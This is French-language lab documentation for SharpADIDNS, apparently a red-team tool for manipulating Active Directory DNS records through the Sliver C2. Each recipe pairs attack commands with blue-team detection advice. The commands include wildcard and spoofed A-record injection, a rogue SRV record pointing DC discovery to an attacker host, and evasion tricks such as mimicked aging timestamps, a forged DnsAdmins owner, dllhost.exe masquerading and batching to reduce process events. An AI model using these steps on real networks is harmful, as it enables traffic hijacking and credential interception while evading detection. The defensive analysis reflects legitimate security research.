# Recipes

**Langues** : [English](RECIPES.md) | [中文](RECIPES.zh-CN.md) | **Français**

Scénarios de laboratoire autour de SharpADIDNS. Chaque recette est décrite sous deux angles :

- **Perspective opérationnelle / laboratoire** — comment reproduire un comportement d'écriture ou de lecture ADIDNS dans un environnement contrôlé ;
- **Perspective défensive** — ce que l'équipe bleue / le SOC peut observer, les alertes, signatures de logs et angles morts de monitoring correspondants.

Chaque recette est autonome — vous pouvez sauter directement à celle dont vous avez besoin. Par défaut on utilise le [mode `--c2`](README.fr.md#utilisation-via-sliver-execute-assembly) comme forme d'invocation, car l'un des principaux chemins de déploiement est Sliver `execute-assembly`. Pour exécuter en shell local, retirez `--c2` et remplacez `--password-base64` par `--password` (en acceptant l'avertissement cleartext).

## Variables utilisées dans toutes les recettes

| Placeholder | Valeur exemple | Source |
| ----------- | ------------- | ------ |
| `$ZONE`     | `redteamnotes.local` | Sortie de `list-zones` (recette 1) |
| `$DN`       | `DC=redteamnotes,DC=local` | Votre domain naming context |
| `$DC`       | `dc.redteamnotes.local` | FQDN du PDC (utilisez `--show-pdc` pour confirmer) |
| `$USER`     | `redteamnotes\redpen` | Compte appelant |
| `$PWB64`    | `UmVkdGVhbU4wdDNzLg==` | `printf 'pwd' \| base64` |

Substituez avec les valeurs de votre laboratoire.

### Raccourcis de syntaxe des arguments

Deux formes de flag sont acceptées : `--flag value` (séparé par espace, utilisé dans toutes les recettes) et `--flag=value` (forme égale). La forme égale est plus robuste à travers le parsing shell multi-couches (Sliver `execute-assembly`, ssh scripté, etc.) quand la valeur contient des espaces, quotes, ou `$`. Mixer est OK : `--username=redteamnotes\u --password-base64 UmVk...` fonctionne.

L'aide par verbe est également disponible : `SharpADIDNS.exe add --help` n'affiche que les flags pertinents pour `add` ; `enum --help` uniquement le sous-ensemble enum ; etc. `--help` global (sans verbe) imprime la référence complète.

---

## 1. État des lieux de l'environnement AD-DNS

**Perspective opérationnelle / laboratoire** : comprendre l'environnement AD-DNS avant toute écriture. Recenser zones, hostnames à noter, patterns de propriété. Lecture seule — pas d'écriture AD, pas d'artefacts disque.

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    --c2 \
    --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    --script "
        list-zones;
        enum --zone $ZONE --filter-type A,AAAA;
        enum --zone $ZONE --filter-name '_*._tcp.*';
        enum --zone $ZONE --only-tombstoned
    "
```

La sortie sur stdout est 4 tableaux JSON (un par statement) plus un `script_summary`. Pipe via `jq` côté appelant :

```bash
# post-traitement côté appelant
... | jq -c 'select(._type != "script_summary") | .nodes[] | {name, dn, records: [.records[].type]}'
```

À rechercher :

- Zones personnalisées au-delà de l'évidente (souvent `dev.redteamnotes.local`, `lab.redteamnotes.local`)
- Enregistrements wildcard `*` déjà déployés (→ ne pas écraser)
- `wpad` / `isatap` / `localhost` (indicateurs legacy ou honeypot)
- Hostnames SCCM / SQL / printer (cibles à fort impact)
- Activité tombstoned récente (opération de nettoyage ou de supervision en cours)

**Perspective défensive** :

- L'énumération LDAP d'une zone entière produit du 4662 (Directory Service Access) sur le DC, à condition que la SACL du zone container soit configurée.
- La famille de détection MDI *Reconnaissance using DNS* a un pattern correspondant, mais le seuil est large — le taux d'alerte réel dépend de la baseline.
- Pure `enum` ne produit pas 5136 / 5137 / 5141 ; l'équipe bleue distingue reconnaissance et requêtes d'administration légitimes uniquement sur le trafic LDAP.
- Recommandation de monitoring : inclure dans la baseline d'anomalie les recherches en gros volume effectuées par des comptes non-service sur les containers `MicrosoftDNS`, `DomainDnsZones`, `ForestDnsZones`.

---

## 2. Écriture d'un enregistrement unique avec filet de rollback

**Perspective opérationnelle / laboratoire** : écrire un enregistrement A (ex. cible de test SCCM ou configuration NTLM en laboratoire), capturer l'état pré-écriture dans le reçu pour pouvoir revenir en arrière.

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name sccm --type A --data 10.0.0.66
```

Le reçu revient sur une ligne JSON. Sauvegardez-le côté appelant avant de faire autre chose :

```bash
... | tee /tmp/sccm-receipt.json | jq .
```

Le champ `reverse` du reçu est votre undo une-ligne pour le cas de création :

```json
{ "action":"add", "operation":"create",
  "reverse": "SharpADIDNS.exe remove --zone redteamnotes.local --name sccm --dn DC=redteamnotes,DC=local --yes",
  ... }
```

Quand vous voulez nettoyer :

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    remove \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone $ZONE --dn $DN --server $DC \
        --name sccm
```

Notez que `reverse` omet délibérément `--username`/`--password*` — re-ajoutez vos flags d'authentification.

**Perspective défensive** :

- La création d'un nouveau dnsNode déclenche 5137 — `ObjectClass=dnsNode`, et `ObjectName` égal au RDN du nouveau nœud (`sccm`). L'équipe bleue identifie un nommage anormal rien que par le nom.
- L'écriture est immédiatement répliquée ; une écriture sur un DC non-PDC laisse une trace du DSA non-PDC dans `replPropertyMetaData`.
- Le `remove` qui suit déclenche 5141 ; la séquence `5137 → 5141` à courte distance forme un pattern « écriture puis recul » — utilisable comme IoA.
- Quand le champ Subject n'est pas un compte privilégié (pas dans `Domain Admins` / `DnsAdmins` / `Enterprise Admins`), la priorité d'alerte devrait monter.
- Recommandation de monitoring : 5137 avec subject non-privilégié + RDN dnsNode matchant des mots-clés d'infrastructure (`sccm`, `mssql`, `proxy`, etc.).

---

## 3. Écriture à faible empreinte (mimic-aging + set-owner)

**Perspective opérationnelle / laboratoire** : comme la recette 2, mais ajuster le blob `dnsRecord` résultant et le propriétaire de l'objet pour ressembler à une écriture DDNS de routine, ce qui réduit les indicateurs forensiques classiques. Utile aussi pour étudier l'impact du fingerprinting sur la couverture de détection de l'équipe bleue.

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name sccm --type A --data 10.0.0.66 \
        --mimic-aging --set-owner "$ZONE\\DnsAdmins"
```

Ce qui change par rapport à la recette 2 :

| Champ | Recette 2 (défaut) | Recette 3 (faible empreinte) |
| ----- | ------------------ | ------------------ |
| `dnsRecord.Timestamp` (offset 20) | `0` (static — IOC) | `hours-since-1601` du moment présent (ressemble à du DDNS naturel) |
| `dnsNode.nTSecurityDescriptor.Owner` | SID de votre token | `DnsAdmins` (privileged group, se fond dans l'activité d'administration de routine) |

Vérifiez après l'écriture :

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    query \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name sccm
```

Confirmez dans le reçu JSON :

- `record.timestamp` est un grand nombre (~3,7M+), pas 0
- `permissions.owner` est `<domain>\DnsAdmins`

**Caveat** : `--set-owner` requiert `WriteOwner` sur le nouveau nœud. Le créateur l'a généralement implicitement sur un nœud qu'il vient de faire. Si `set_owner.result` dans le reçu vaut `"error"`, vous n'avez pas le droit ; l'écriture de l'enregistrement elle-même a quand même réussi.

**Perspective défensive** :

- `mimic-aging` produit `dnsRecord.Timestamp != 0`, contournant l'IOC simple « `Timestamp=0` static dans une zone dynamic-update ». Mais `whenChanged` garde le vrai timestamp d'écriture ; comparé au rythme de DDNS update typique d'autres hosts de la zone, l'anomalie reste détectable.
- Après `set-owner`, le champ `Subject` dans 5137 / 5136 garde le **vrai initiateur**, pas le nouveau owner. Le owner n'affecte que la vue de nTSecurityDescriptor lue après coup.
- Le DSA originant dans `replPropertyMetaData` n'est pas falsifiable — d'où vient l'écriture et quand, ground truth.
- Recommandation de monitoring : ne pas se fier qu'à `Timestamp=0` ; faire le cross-check entre `Subject` du 5137 et l'owner SID final du dnsNode, pour détecter des mismatch type « je m'appelle Bob mais j'ai créé un nœud dont DnsAdmins est owner ».

---

## 4. Écriture d'un enregistrement A wildcard (test de couverture de zone)

**Perspective opérationnelle / laboratoire** : écrire un enregistrement wildcard dans la zone pour faire résoudre tous les noms non résolus vers une IP donnée. Sert à valider le comportement ADIDNS, tester le fallback resolver, ou monter des PoC de bout en bout en laboratoire.

**ATTENTION** : c'est l'écriture la plus impactante que l'outil puisse faire. Lancez la recette 1 d'abord pour confirmer qu'aucun wildcard légitime n'existe. Touche **tous** les hostnames inexistants dans la zone jusqu'à suppression. `--c2` implique déjà `--yes`, donc l'outil ne demandera pas — soyez intentionnel.

```bash
# pré-vérification : un wildcard existe-t-il déjà ?
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    enum \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --filter-name '\*'

# écriture (uniquement si la pré-vérification a retourné 0 nœud)
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name "*" --type A --data 10.0.0.66 --ttl 60 \
        --mimic-aging
```

`--ttl 60` rend l'enregistrement éphémère dans les caches clients — la suppression se propage en une minute. (600s par défaut conviennent aussi, mais 60 est plus pratique pour « in-and-out fast ».)

Nettoyage :

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    remove \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone $ZONE --dn $DN --server $DC \
        --name "*"
```

Relancez la recette 1 pour confirmer que le wildcard a disparu.

**Perspective défensive** :

- 5137 avec `RDN='*'` est une alerte **highest-priority** dans presque tous les content packs MDI / Sentinel / Splunk pour ADIDNS.
- *Suspicious DNS record creation* (MDI) a une règle spécifique aux noms wildcard, sans config supplémentaire.
- La GQBL ne bloque pas wildcard (elle ne couvre que `wpad` / `isatap`), donc le serveur DNS répond — le monitoring DNS query (passive DNS / DNS firewall) verra l'anomalie « beaucoup de hosts inconnus résolus vers la même IP ».
- TTL=60 est plus court que le TTL typique des zones (souvent 600+ ou 3600) — c'est en soi un signal anomalie sur la baseline SIEM.
- Recommandation de monitoring : 5137 avec RDN matchant `^[*]$` ou `wpad|isatap|localhost` → priorité maximale directe ; en parallèle, surveiller le « host inconnu qui a maintenant une résolution » côté DNS resolver clients.

---

## 5. Ajout d'enregistrement SRV (étude du comportement de résolution SRV)

**Perspective opérationnelle / laboratoire** : ajouter un enregistrement SRV supplémentaire sur un nœud existant pour étudier le comportement de résolution SRV des clients Windows (sélection priority/weight, traitement de cibles multiples coexistantes, etc.). Utile en environnement de laboratoire pour la recherche sur les mécanismes de localisation de services AD.

Le nœud d'étude couramment utilisé en laboratoire est `_ldap._tcp.dc._msdcs.<zone>` (où les DCs s'annoncent). Un nouveau SRV avec les paramètres `priority 0 weight 100 port 389` cohabitera avec celui du DC légitime comme candidat — le client applique alors son algorithme de sélection SRV.

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name '_ldap._tcp.dc._msdcs' \
        --type SRV --srv-priority 0 --srv-weight 100 --srv-port 389 \
        --data attacker.$ZONE \
        --append --mimic-aging
```

`--append` est le bon mode ici : les enregistrements SRV du DC légitime restent ; le vôtre est ajouté à côté. Sans `--append`, il faudrait `--force` et vous écraseriez les SRV du vrai DC (probablement catastrophique en production).

Pour vérifier toutes les entrées SRV sur le nœud après :

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    query \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name '_ldap._tcp.dc._msdcs'
```

Le nettoyage doit supprimer **uniquement votre enregistrement**, pas les SRV légitimes du DC. Le `previous_state.records_base64` du reçu contient les blobs SRV originaux. Pour restaurer exactement :

```bash
# côté appelant : extraire previous_state.records_base64 du reçu sauvegardé,
# puis pour chaque entrée b64 sur le nœud :

# 1) disable le nœud entier (efface tous les SRV, met le tombstone)
sliver > execute-assembly ... disable --zone $ZONE --name '_ldap._tcp.dc._msdcs' --dn $DN

# 2) re-ajouter chaque blob SRV original via --raw
sliver > execute-assembly ... add --zone $ZONE --name '_ldap._tcp.dc._msdcs' \
    --raw <previous_state.records_base64[0]> --force --dn $DN
sliver > execute-assembly ... add --zone $ZONE --name '_ldap._tcp.dc._msdcs' \
    --raw <previous_state.records_base64[1]> --append --dn $DN
# ... répéter pour chaque enregistrement original restant
```

Multi-étapes est intentionnel ; le champ `reverse` de l'outil vaut `null` pour les cas `add --append` car aucune commande unique ne l'annule.

**Perspective défensive** :

- Un nouveau dnsNode ou une modification dnsRecord sous le sous-arbre `_msdcs` est quasiment toujours anormal — les SRV DC légitimes sont gérés automatiquement par le service netlogon, pas par écriture humaine.
- 5136 sur dnsRecord avec ObjectDN contenant `_*._tcp.*._msdcs.*` est un pattern MDI à forte confiance ; recommandé pour l'équipe bleue de créer une saved search SIEM dédiée.
- Le changement de comportement du DC locator côté client laisse des traces ETW Windows (DC Locator) — comparer avec le timestamp d'écriture SRV confirme la causalité.
- Le champ `version` de `dnsRecord` dans `replPropertyMetaData` s'incrémente à chaque écriture — un pic est une preuve indirecte d'écritures fréquentes.
- Recommandation de monitoring : prioriser au max 5136 avec `AttributeLDAPDisplayName=dnsRecord` et ObjectDN contenant `_msdcs`, quel que soit le Subject.

---

## 6. Opération batch via `--script` (un execute-assembly, plusieurs actions)

**Perspective opérationnelle / laboratoire** : faire une opération en 3 étapes (pre-check → modifier → post-check) en une seule invocation `execute-assembly`, pour qu'elle apparaisse comme **un** Sysmon EID 1 au lieu de trois. Sert aussi à évaluer la différence côté EDR / SOC entre N actions et 1 processus.

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    --c2 \
    --username "$USER" --password-base64 "$PWB64" \
    --zone "$ZONE" --dn "$DN" --server "$DC" \
    --script "
        enum --filter-name 'sccm*';
        add --name sccm --type A --data 10.0.0.66 --mimic-aging --set-owner '$ZONE\\\\DnsAdmins';
        query --name sccm
    "
```

Notez les backslashs doublés `\\\\` dans `--set-owner` : le parseur de commandes Sliver mange une paire, le parseur d'args C# mange la deuxième paire, la chaîne finale vue par l'outil est `$ZONE\DnsAdmins`. **Testez toujours le niveau d'escape dans votre setup Sliver spécifique d'abord** avec un script `--dry-run`.

Sortie sur stdout : 3 reçus (un par statement) + 1 ligne `script_summary`. Pipe via `jq -c .` côté appelant ; chaque ligne est du JSON indépendamment valide, et les quatre partagent le même `correlation_id`, donc un collecteur en aval peut les grouper avec `jq -s 'group_by(.correlation_id)'`.

`--script-on-error halt` (défaut) s'arrête au premier échec. Pour du « batch best-effort », utilisez `--script-on-error continue` (ou l'alias court `--continue-on-error`) et vérifiez le compte `failed` dans le résumé.

**Perspective défensive** :

- `--script` ne réduit **pas** les événements côté DC — les N actions produisent chacune leur 5136 / 5137 / 5141. Ce qui est réduit, c'est le nombre de process spawn côté endpoint.
- Une équipe bleue qui ne regarde que l'audit DC ne voit pas la différence « batch vs unitaire » ; il faut l'EDR endpoint (process tree, CLR loading, network outbound) pour distinguer.
- L'ETW provider `Microsoft-Windows-DotNETRuntime` émet des événements caractéristiques au chargement reflectif .NET — couplé au process create, on identifie le pattern execute-assembly.
- `correlation_id` est un ID interne à l'outil, inexistant dans les logs DC — pour corréler plusieurs actions à une invocation unique, l'équipe bleue doit utiliser les données endpoint (PID + fenêtre temporelle).
- Recommandation de monitoring : côté endpoint, ETW + `Image=svchost.exe`/`dllhost.exe`/`RuntimeBroker.exe` + trafic LDAP outbound simultanés constituent une forte signature execute-assembly.

---

## 7. Restauration de l'environnement depuis un fichier de backup

**Perspective opérationnelle / laboratoire** : annuler chaque écriture faite pendant l'expérience, en utilisant uniquement le fichier JSONL de backup que vous avez accumulé.

Pendant toute l'expérience, vous avez ajouté `--backup-to ops.jsonl` (un vrai chemin, pas `-`) pour que chaque écriture capture son `previous_state` dans un fichier sur un hôte que vous contrôlez. Maintenant vous voulez revenir en arrière.

```bash
# côté appelant : chaque ligne dans ops.jsonl est une entrée de backup
# autonome pour un nœud. Traitez-les dans l'ordre inverse (les plus récentes d'abord) :

tac ops.jsonl | while IFS= read -r entry; do
    dn=$(jq -r .dn <<<"$entry")
    name=$(jq -r '.dn | split(",")[0] | sub("^DC="; "")' <<<"$entry")
    zone=$(jq -r '.dn | split(",")[1] | sub("^DC="; "")' <<<"$entry")  # adaptez à votre DN de zone
    records=$(jq -c '.records' <<<"$entry")
    tombstoned=$(jq -r .dNSTombstoned <<<"$entry")

    if [ "$records" = "[]" ] && [ "$tombstoned" = "false" ]; then
        # le nœud n'existait pas avant notre changement → remove maintenant
        sliver > execute-assembly ... remove --zone "$zone" --name "$name" ...
    else
        # le nœud existait → disable pour effacer nos écritures, puis re-ajouter chaque enregistrement original
        sliver > execute-assembly ... disable --zone "$zone" --name "$name" ...
        jq -r '.records[]' <<<"$entry" | while read -r blob; do
            sliver > execute-assembly ... add --raw "$blob" --force --zone "$zone" --name "$name" ...
        done
    fi
done
```

Testez d'abord cette boucle sur une seule entrée (avec `--dry-run` ajouté à chaque `execute-assembly`). Puis lancez pour de vrai.

Pour un équivalent entièrement en mémoire sans `ops.jsonl` sur disque, il aurait fallu sauvegarder le reçu de chaque écriture côté C2 à la place. Même logique, source différente.

**Perspective défensive** :

- Le rollback lui-même produit des 5136 / 5137 / 5141 — pour le DC, c'est juste plus d'écritures, ça n'« efface pas les traces d'audit ».
- Une séquence `add → disable → add --raw` à courte distance temporelle est un pattern anormal (un DDNS légitime ne fonctionne pas comme ça) ; l'équipe bleue peut concevoir une détection basée sur séquence.
- Si l'équipe bleue récupère le fichier `ops.jsonl` sur l'endpoint, c'est un **trail forensique complet** — contient tous les DN, timestamps, records_base64 originaux, plus granulaire que l'audit DC.
- `--backup-to -` (stdout sans écriture disque) nécessite de garder le flux des reçus pour rollback — l'équipe bleue ne récupère pas ce trail sur l'endpoint, mais peut le reconstruire depuis la capture du canal C2 (avec interception TLS).
- Recommandation de monitoring : côté DC, surveiller le même dnsNode subissant 5136 / 5137 / 5141 de façon rapprochée et répétée ; côté endpoint, surveiller la création de fichiers `.jsonl` dans des chemins atypiques (comme `C:\Windows\System32\*.jsonl`).

---

## 8. Vérification préalable des permissions (inspection DACL)

**Perspective opérationnelle / laboratoire** : avant de tenter un `--force` replace ou un `remove`, confirmer que vous avez les droits d'écriture sur le nœud cible — sans réellement effectuer l'écriture. Sert aussi à étudier la différence d'audit entre lecture DACL et écriture DACL.

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    query \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name fileserver \
        -v
```

`-v` (verbose) dump aussi les ACEs hérités. Dans `permissions.aces[]` du reçu, cherchez :

- Entrées où `trustee` inclut votre utilisateur / un groupe dont vous êtes membre / `Authenticated Users`
- `type: "Allow"` (pas Deny)
- `rights` contient `WriteProperty`, `WriteDacl`, ou `GenericAll`

Si aucun ne matche → l'appelant n'a pas les droits → n'essayez pas l'écriture, économisez l'événement d'audit.

Si le seul ACE correspondant est `Authenticated Users` avec `CreateChild` sur le container de zone (pas sur le nœud lui-même), vous pouvez créer de *nouveaux* nœuds mais pas modifier l'existant — pertinent pour la sémantique de `--append`.

**Perspective défensive** :

- Une lecture DACL via LDAP déclenche 4662 avec `Access Mask = 0x20` (Read Property) ou `0x80` (Read Control), pas un write mask.
- La valeur d'alerte du 4662 est généralement basse (les outils d'administration légitimes lisent fréquemment la DACL), mais la lecture intensive de DACL sur plusieurs dnsNodes à forte valeur est une signature de *reconnaissance*.
- L'absence de 5136 / 5137 réels indique uniquement de la retenue de la part de l'appelant — pas qu'aucune reconnaissance n'a été tentée. L'équipe bleue doit regarder la fréquence et le spread des cibles dans 4662, pas l'événement seul.
- MDI inclut la lecture intensive de nTSecurityDescriptor dans sa famille de détection LDAP reconnaissance, mais le seuil de déclenchement est large.
- Recommandation de monitoring : un même subject non-privilégié qui interroge les nTSecurityDescriptor de plusieurs dnsNodes en peu de temps → candidat reconnaissance ; pas besoin d'alerter par événement, faire une baseline de fréquence.

---

## Rappels transversaux

Ceux-ci s'appliquent à toutes les recettes, pas seulement une :

- **Toujours `--dry-run` d'abord** pour toute opération d'écriture jamais faite dans cet environnement. Le dry-run se lie quand même (donc s'audit-logue comme une lecture), mais n'écrit pas.
- **Toujours avoir un plan de restauration** avant d'écrire. Soit `--backup-to file` (coût disque), soit `--backup-to -` (dans le reçu, éphémère), soit capture manuelle du `previous_state` depuis le reçu.
- **`--c2` implique `--yes`** — pas de prompt humain. L'outil ne vous arrêtera pas pour wildcards, `wpad`/`isatap`, dé-tombstoning, ou hard-remove. Soyez intentionnel.
- **L'audit côté DC (5136 / 5137 / 5141) et les capteurs Defender for Identity se déclenchent indépendamment de `--c2`**. L'outil minimise l'empreinte côté appelant ; rien dans l'outil ne vous cache des logs d'audit du DC.
- **Le champ `reverse` est un best-effort une-ligne**. Pour replace / append / disable / remove, `reverse` vaut `null` et vous devez reconstruire depuis `previous_state.records_base64`. Ne comptez pas que sur `reverse` — gardez le reçu complet.
- **Le baseline défensif** : les sections « Perspective défensive » ne sont pas exhaustives — un SOC déployé en vrai dispose en plus d'EDR endpoint, de DPI réseau, de logs de requêtes DNS, de métadonnées de réplication AD, etc. Toute opération ADIDNS doit présumer **qu'au moins une source de données la voit**.

Pour le modèle de visibilité d'audit plus large, voir [`Visibilité d'audit`](README.fr.md#visibilité-daudit) dans le README principal.
